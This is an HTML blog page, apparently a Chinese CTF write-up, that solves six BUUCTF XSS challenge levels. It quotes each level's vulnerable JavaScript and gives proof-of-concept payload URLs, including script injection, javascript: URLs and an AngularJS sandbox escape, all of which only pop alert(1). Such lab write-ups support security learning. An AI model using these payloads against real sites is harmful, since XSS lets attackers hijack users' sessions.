@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="记录buuctf里的XSS题目，也算实践新学的知识了 [第二章 web进阶]XSS闯关法 1level 11http:&#x2F;&#x2F;2af81863-bb58-4032-a9a1-4bdf35882c06.node4.buuoj.cn:81&#x2F;level1?username&#x3D;xss&lt;script&gt;alert(1)&lt;&#x2F;script&gt; level 212345678910    	if(l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-XSS题目">
+<meta property="og:url" content="http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="记录buuctf里的XSS题目，也算实践新学的知识了 [第二章 web进阶]XSS闯关法 1level 11http:&#x2F;&#x2F;2af81863-bb58-4032-a9a1-4bdf35882c06.node4.buuoj.cn:81&#x2F;level1?username&#x3D;xss&lt;script&gt;alert(1)&lt;&#x2F;script&gt; level 212345678910    	if(l">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-22T11:12:00.000Z">
+<meta property="article:modified_time" content="2022-03-22T11:39:38.377Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-XSS题目</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&text=BUUCTF-XSS题目"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&title=BUUCTF-XSS题目"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&is_video=false&description=BUUCTF-XSS题目"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-XSS题目&body=Check out this article: http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&title=BUUCTF-XSS题目"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&title=BUUCTF-XSS题目"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&title=BUUCTF-XSS题目"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&title=BUUCTF-XSS题目"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&name=BUUCTF-XSS题目&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&t=BUUCTF-XSS题目"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-web%E8%BF%9B%E9%98%B6-XSS%E9%97%AF%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">[第二章 web进阶]XSS闯关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95-1"><span class="toc-number">1.1.</span> <span class="toc-text">法 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1"><span class="toc-number">1.1.1.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2"><span class="toc-number">1.1.2.</span> <span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-3"><span class="toc-number">1.1.3.</span> <span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-4"><span class="toc-number">1.1.4.</span> <span class="toc-text">level 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-5"><span class="toc-number">1.1.5.</span> <span class="toc-text">level 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-6"><span class="toc-number">1.1.6.</span> <span class="toc-text">level 6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95-2"><span class="toc-number">1.2.</span> <span class="toc-text">法 2</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-XSS题目
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/" class="leancloud-visitors" data-flag-title="BUUCTF-XSS题目">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-22T11:12:00.000Z" itemprop="datePublished">2022-03-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/XSS/" rel="tag">XSS</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>记录buuctf里的XSS题目，也算实践新学的知识了</p>
+<h1 id="第二章-web进阶-XSS闯关"><a href="#第二章-web进阶-XSS闯关" class="headerlink" title="[第二章 web进阶]XSS闯关"></a>[第二章 web进阶]XSS闯关</h1><h2 id="法-1"><a href="#法-1" class="headerlink" title="法 1"></a>法 1</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level1?username=xss&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">var</span> username = <span class="string">&#x27;xss payload&#x27;</span>;</span><br><span class="line">    	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + <span class="built_in">escape</span>(username);</span><br><span class="line">    </span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string">构造，闭合语句</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>python</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//2af81863-bb58-4032-a9a1-4bdf35882c06.node4.buuoj.cn:81/level2?username=xss&#x27;;alert(1);//</span></span><br></pre></td></tr></table></figure>
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用url=<span class="attr">http</span>:<span class="comment">//2af81863-bb58-4032-a9a1-4bdf35882c06.node4.buuoj.cn:81/level3?username=xssaaa&#x27;;alert(1);//</span></span><br><span class="line">后端被转义</span><br><span class="line">    	<span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    		location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">var</span> username = <span class="string">&#x27;xssaaa\&#x27;;alert(1);//&#x27;</span>;</span><br><span class="line">    	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + username;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<p>构造转义的转义</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level3?username=xssaaa\<span class="string">&#x27;;alert(1);//</span></span><br></pre></td></tr></table></figure>
+<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  	<span class="keyword">var</span> time = <span class="number">10</span>;</span><br><span class="line">  	<span class="keyword">var</span> jumpUrl;</span><br><span class="line">  	<span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>) == <span class="literal">false</span>)&#123;<span class="comment">//获取jumpUrl参数值</span></span><br><span class="line">  		jumpUrl = location.<span class="property">href</span>;</span><br><span class="line">  	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  		jumpUrl = <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>);</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time);</span><br><span class="line">  	<span class="keyword">function</span> <span class="title function_">jump</span>(<span class="params">time</span>)&#123;<span class="comment">//重定向</span></span><br><span class="line">  		<span class="keyword">if</span>(time == <span class="number">0</span>)&#123;</span><br><span class="line">  			location.<span class="property">href</span> = jumpUrl;</span><br><span class="line">  		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  			time = time - <span class="number">1</span> ;</span><br><span class="line">  			<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">`页面<span class="subst">$&#123;time&#125;</span>秒后将会重定向到<span class="subst">$&#123;<span class="built_in">escape</span>(jumpUrl)&#125;</span>`</span>;</span><br><span class="line">  			<span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time);</span><br><span class="line">  		&#125;</span><br><span class="line">  	&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)<span class="comment">//获取GET参数</span></span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+<p>根据JS 代码的url解码规则，我们在jumpUrl里面加入JS协议即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level4?jumpUrl=javascript:alert(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  	<span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;autosubmit&#x27;</span>) !== <span class="literal">false</span>)&#123;<span class="comment">//判断autosubmit是否为false</span></span><br><span class="line">  		<span class="keyword">var</span> autoForm = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;autoForm&#x27;</span>);</span><br><span class="line">  		autoForm.<span class="property">action</span> = (<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>) == <span class="literal">false</span>) ? location.<span class="property">href</span> : <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>);<span class="comment">//存在action参数即跳转道action</span></span><br><span class="line">  		autoForm.<span class="title function_">submit</span>();</span><br><span class="line">  	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  		</span><br><span class="line">  	&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)<span class="comment">//获取GET参数值</span></span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+<p>所以我们直接传入两个参数并且构造跳转即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level5?autosubmit=aaa&amp;&amp;action=javascript:alert(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>模板注入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level6?username=&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>返回成积，再看后端模板<code>AngularJS</code><br>知识盲区了，所以参考网友的结果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level6?username=?username=&#123;&#123;<span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;$<span class="built_in">eval</span>(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="法-2"><a href="#法-2" class="headerlink" title="法 2"></a>法 2</h2><p>我们可以F12，在控制台直接 alert(1),通杀！ 嘿嘿嘿,不过这题就没有意义了。   </p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://nosec.org/home/detail/4153.html">AngularJS客户端模板注入（XSS）</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4638">AngularJS Sandbox Bypasses</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-web%E8%BF%9B%E9%98%B6-XSS%E9%97%AF%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">[第二章 web进阶]XSS闯关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95-1"><span class="toc-number">1.1.</span> <span class="toc-text">法 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1"><span class="toc-number">1.1.1.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2"><span class="toc-number">1.1.2.</span> <span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-3"><span class="toc-number">1.1.3.</span> <span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-4"><span class="toc-number">1.1.4.</span> <span class="toc-text">level 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-5"><span class="toc-number">1.1.5.</span> <span class="toc-text">level 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-6"><span class="toc-number">1.1.6.</span> <span class="toc-text">level 6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95-2"><span class="toc-number">1.2.</span> <span class="toc-text">法 2</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&text=BUUCTF-XSS题目"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&title=BUUCTF-XSS题目"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&is_video=false&description=BUUCTF-XSS题目"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-XSS题目&body=Check out this article: http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&title=BUUCTF-XSS题目"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&title=BUUCTF-XSS题目"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&title=BUUCTF-XSS题目"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&title=BUUCTF-XSS题目"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&name=BUUCTF-XSS题目&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/&t=BUUCTF-XSS题目"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
